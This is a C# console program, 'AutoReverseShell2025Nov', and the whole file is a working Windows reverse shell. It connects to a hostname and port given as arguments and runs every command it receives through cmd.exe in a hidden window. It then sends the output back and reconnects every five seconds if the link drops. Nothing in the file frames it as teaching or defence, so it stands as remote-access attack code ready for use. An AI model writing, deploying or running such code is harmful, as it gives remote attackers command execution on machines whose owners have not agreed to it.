using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace AutoReverseShell2025Nov
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: AutoReverseShell2025Nov <hostname> <port>");
                return;
            }

            string hostname = args[0];
            if (!int.TryParse(args[1], out int port))
            {
                Console.WriteLine("Error: Port must be a valid integer.");
                return;
            }

            await ConnectAndExecuteAsync(hostname, port);
        }

        static async Task ConnectAndExecuteAsync(string hostname, int port)
        {
            while (true)
            {
                try
                {
                    Console.WriteLine($"Attempting to connect to {hostname}:{port}...");

                    using var client = new TcpClient();
                    await client.ConnectAsync(hostname, port);
                    Console.WriteLine("Connected!");

                    using var stream = client.GetStream();
                    var buffer = new byte[4096];

                    while (client.Connected)
                    {
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        if (bytesRead == 0) break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        Console.WriteLine($"Received command: {command}");

                        if (string.IsNullOrWhiteSpace(command))
                            continue;

                        string output = ExecuteCommand(command);
                        byte[] responseBytes = Encoding.UTF8.GetBytes(output + "\n");
                        await stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Connection error: {ex.Message}");
                }

                Console.WriteLine("Connection lost. Retrying in 5 seconds...");
                await Task.Delay(5000);
            }
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                var processInfo = new ProcessStartInfo("cmd.exe", $"/c {command}")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(processInfo);
                if (process == null)
                    return "Error: Failed to start process.";

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                return string.IsNullOrEmpty(error) ? output : $"{output}\n{error}";
            }
            catch (Exception ex)
            {
                return $"Execution error: {ex.Message}";
            }
        }
    }
}
